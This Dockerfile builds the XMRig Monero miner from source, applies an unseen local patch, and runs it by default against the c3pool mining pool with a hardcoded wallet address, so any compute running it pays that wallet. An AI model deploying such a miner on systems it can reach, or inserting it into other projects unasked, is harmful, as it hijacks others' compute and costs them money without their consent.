FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v5.11.2'

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
COPY build.patch /root/xmrig/
RUN git apply build.patch
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc15
RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero
COPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero

ENTRYPOINT ["./xmrig"]
CMD ["--url=mine.c3pool.com:13333", "--user=48R2WGyqoZGCGM2hR24U9PELdU27pPsUbGejM8NpcK1X2qxxCXSdcCDdt3F3UeAvLSKxes9bkJrFGMgdkzmsUjrZBPL3Ttp", "--pass=Docker", "-k"]˚
